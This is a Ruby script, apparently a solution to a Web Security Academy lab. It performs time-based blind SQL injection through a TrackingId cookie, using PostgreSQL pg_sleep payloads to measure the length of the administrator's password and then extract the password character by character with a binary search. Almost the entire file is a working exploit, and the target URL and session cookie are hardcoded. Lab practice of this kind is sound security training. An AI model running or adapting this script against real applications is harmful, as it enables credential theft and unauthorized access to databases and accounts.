require 'net/http'
require 'uri'

FORCED_DELAY = 3

def blind_sql_pass_len(len)
 "TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+length(password)>#{len})+THEN+pg_sleep(#{FORCED_DELAY})+ELSE+pg_sleep(0)+END+FROM+users--"
end

def blind_sql_pass(position, test)
  "TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+substring(password,#{position},1)>'#{test}')+THEN+pg_sleep(#{FORCED_DELAY})+ELSE+pg_sleep(0)+END+FROM+users--"
end

def request(injection)
  uri = URI.parse("https://acd71fb41e88f8ed80475214004d00bf.web-security-academy.net/")
  request = Net::HTTP::Get.new(uri)
  request["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:84.0) Gecko/20100101 Firefox/84.0"
  request["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
  request["Accept-Language"] = "en-CA,en-US;q=0.7,en;q=0.3"
  request["Connection"] = "keep-alive"
  request["Cookie"] = "#{injection}; session=ngEBVBAKJUpCiouI6WcuJ687Ae0Y0vhx"
  request["Upgrade-Insecure-Requests"] = "1"
  request["Pragma"] = "no-cache"
  request["Cache-Control"] = "no-cache"

  req_options = {
    use_ssl: uri.scheme == "https",
  }

  Net::HTTP.start(uri.hostname, uri.port, req_options) do |http|
    http.request(request)
  end
end

def binary_time_search(position, character_set)
  needle = character_set.size / 2
  previous_needle = nil

  head = 0
  tail = character_set.size - 1

  loop do
    current_time = Time.now
    injection = blind_sql_pass(position, character_set[needle])
    request(injection)
    delay = Time.now - current_time

    if delay > FORCED_DELAY
      head = needle
    else
      tail = needle
    end

    previous_needle = needle
    needle = ((head + tail) / 2).floor

    if needle == previous_needle
      return delay > FORCED_DELAY ? character_set[needle + 1] : character_set[needle]
    end
  end
end

pass_len = 10

loop do
  current_time = Time.now
  injection = blind_sql_pass_len(pass_len)
  request(injection)

  if Time.now - current_time > FORCED_DELAY
    pass_len += 1
  else
    break
  end
end

puts "Password length: #{pass_len}"

character_set = (0..9).to_a + ('a'..'z').to_a
answer = ''

puts "Starting enumeration..."
(1..pass_len).each do |position|
  answer += binary_time_search(position, character_set).to_s
  puts answer
end

puts "Done!"
